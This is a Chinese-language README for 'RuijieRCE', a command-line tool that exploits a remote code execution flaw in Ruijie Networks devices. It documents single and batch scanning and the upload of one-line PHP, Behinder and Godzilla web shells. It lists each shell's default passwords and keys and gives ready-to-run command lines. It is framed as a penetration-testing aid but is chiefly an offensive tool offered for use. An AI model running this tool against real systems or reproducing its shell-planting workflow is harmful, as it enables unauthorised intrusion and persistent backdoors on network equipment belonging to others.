# RuijieRCE
#Tools
Ruijie Networks RCE漏洞检测工具，为方便渗透测试使用，可以批量检测，也会生成历史记录。同时也为防止他人恶意使用，可自定义GET参数密码，该密码由sha256加密，难以破解。同时也可以上传冰蝎马或者哥斯拉马。



## 参数
```bash
Usage of ./RuijieRCE:
  -f string
    	导入.txt文件批量扫描
  -k string
    	写入shell密钥，一句话马默认为cmd，哥斯拉马默认为key，冰蝎马没有密钥
  -n string
    	写入shell默认一句话马🐎，B冰蝎马，G哥斯拉马
  -p string
    	写入shell密码，一句话马默认为cmd，哥斯拉马默认为pass，冰蝎马默认为rebeyond
  -u string
    	目标URL
```

## 使用
检测到漏洞后生成随机数.php文件执行命令，也可以上菜刀。
![](./Cknife.png)

![](RuijieRCE/Cknife.png)

### 上传一句话木马
GET密码：cmd
POST密码：cmd
```bash
./RuijieRCE -u http://127.0.0.1:4430
```

#### 设置密码
-n参数为POST密码，-p参数为GET密码
这两个参数缺省时均为cmd，可以只设置一个或者同时都设置
```bash
./RuijieRCE -u http://127.0.0.1:4430 -n asd -p zxc
```

### 上传冰蝎马
默认密钥为rebeyond，也可以使用-p参数修改
```
./RuijieRCE -u http://127.0.0.1:4430 -n B -p rebeyond
```

### 上传哥斯拉马
哥斯拉加密器使用BASE64，默认密码为pass，密钥为key
```
./RuijieRCE -u http://127.0.0.1:4430 -n G -p pass -k key
```

### 批量测试
批量测试时也可以设置上传冰蝎马、哥斯拉马以及自定义密码
```bash
./RuijieRCE -f url.txt
```
